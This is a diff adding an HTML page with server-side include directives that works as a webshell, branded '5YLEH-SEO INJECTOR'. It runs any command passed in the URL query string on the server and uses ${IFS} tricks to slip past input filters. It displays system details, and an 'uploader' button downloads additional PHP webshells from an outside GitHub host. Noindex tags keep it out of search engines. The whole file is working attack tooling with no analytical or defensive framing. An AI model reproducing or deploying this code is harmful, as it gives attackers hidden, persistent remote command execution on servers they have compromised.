@@ -1,0 +1,227 @@
+<!--#config errmsg="Function SSI Disabled"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls -al" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="robots" content="noindex">
+<meta name="robots" content="noindex, nofollow" />
+<title>inejktion</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function nezcmd()
+{
+  var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+
+function addupload()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/myfk.php${IFS}|${IFS}tee${IFS}-a${IFS}myfk.php7;curl${IFS}-Ls${IFS}raw.githubusercontent.com/exploit-haxor/webshell/master/myfk3.php${IFS}|${IFS}tee${IFS}-a${IFS}ganteng.php";
+}
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #141414;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+
+</head>
+<meta name="robots" content="noindex">
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+	@import url('https://fonts.googleapis.com/css?family=Russo+One');
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
+
+body::-webkit-scrollbar {
+  width: 12px;
+}
+
+body::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+	background-color: #636263;
+	text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+	background-color: #25383C;
+}
+
+#content .first:hover {
+	background-color: #25383C
+	text-shadow:0px 0px 1px #757575;
+}
+
+table {
+	border: 1px #000000 dotted;
+	table-layout: fixed;
+}
+
+td {
+	word-wrap: break-word;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000000;
+	text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+	border: 1px #000000 solid;
+	-moz-border-radius: 5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+}
+
+.gas {
+	background-color: #1f1f1f;
+	color: #ffffff;
+	cursor: pointer;
+}
+
+select {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+select:after {
+	cursor: pointer;
+}
+
+.linka {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+.up {
+	background-color: transparent;
+	color: #fff;
+}
+
+option {
+	background-color: #1f1f1f;
+}
+
+.btf {
+	background: transparent;
+	border: 1px #fff solid;
+	cursor: pointer;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
+<center>
+<meta name="robots" content="noindex, nofollow" />
+<b><font face="Bungee" size="7"><i>5YLEH-SEO</font></b><font face="courier">
+	<br><br>System : <b><!--#exec cmd="{uname,-nrv}" --></b>
+	<br>Current Path : <b><!--#echo var=DOCUMENT_ROOT --></b></i><br><br>
+	MySql : <b><!--#exec cmd="{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp; Wget : <b><!--#exec cmd="{test,-e,/usr/bin/wget}&&{echo,ON}||{echo,OFF}" --></b></b>&nbsp;|&nbsp; Curl : <b><!--#exec cmd="{test,-e,/usr/bin/curl}&&{echo,ON}||{echo,OFF}" --></b><br>
+	<font> COMMAND : <input type="text" size="30" id="command" class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<button class="input" id="gas" onclick="nezcmd();">execute</button> <button class="input" id="gas" onclick="addupload();">uploader</button><br><br>
+Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl --></font></b></i>
+<pre><!--#exec cmd=$shl --></pre>
+<script>var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+	document.getElementById("cmd").innerHTML = cmd;
+	var gaskan = document.getElementById("command");
+	gaskan.addEventListener("keyup", function(event) {
+	  if (event.keyCode === 13) {
+	    event.preventDefault();
+	    document.getElementById("gas").click();
+	}
+});
+</script>
+</html>
+<meta name="robots" content="noindex">
+<body>
+   <div id="shell">
+            <pre id="shell-content">
+                <div id="shell-logo">
+<pre>
+                 
+       
+
+                    ,                                                 
+                    .                              ,                  
+                 ,,                                  ,.               
+                ,,,                                  ,,.              
+                ,,,,                             . .,,,,              
+                ,,,,,,  ,**********************.  ,,,,,.              
+               . ,,,,,,, ********************** ,,,,,,,               
+                  ,,,,, ************************ ,,,,,                
+                 , ,. ,**************************, ,. ,               
+            ..,  ,,*********************************,**  /..          
+      .  ******  *,****  @@@  ************ *@@&  ******  *****,  .    
+        ******* .,***. @@@@@@@ ,******** (@@@@@@@ *****  *******      
+        **,. ** .,,,, @@@@& &@@ ******** @&  &@@@( ****  **  *** /    
+         * * ** .,,,* @@@@@@@@& ******** @@@@@@@@  ****  *,.*         
+         ,,,,,, .,,,,*.************************** *****  ,,,,    @/   
+                .,,,,*,,*******************************          #(   
+                .,,,   ,,******************************          .    
+                 ,,,,, @ @@@&     ,********************  ,            
+               .  .,,,, #@@@@@@@@@@@@&&&&%.      ,***                 
+                     ,,,       ,*,,*,**,***********  .                
+                       ,,,,,,,,,,,, ,,,,,,,,*,.*                      
+                          ,,,,,,,,,,,,,,,,,,,   .                     
+                            ,,,,,     ,,,,,,  .
+
+
+
+
+        _____ _       _ _ 
+ ___ ___ _ _ _|   __| |_ ___| | |
+| . | . | | | |__   |   | -_| | |
+|_  |  _|_____|_____|_|_|___|_|_|
+|___|_| 5YLEH-SEO INJECTOR
+
+TERUS BERKEMBANG MESKI TAK TERLIHAT
+
+<span></span>
+                </div>
+            </pre>
+<center>
+<meta name="robots" content="noindex">
+  <body>
+    <font size=2>
+        Server : <!--#exec cmd="{uname,-nr}" --><br>
+        GMT date : <!--#echo var=DATE_GMT --><br>
+        Local date : <!--#echo var=DATE_LOCAL --><br>
+        Document URI :<!--#echo var=DOCUMENT_URI --><br>
+        Last modified : <!--#echo var=LAST_MODIFIED --><br>
+<br>
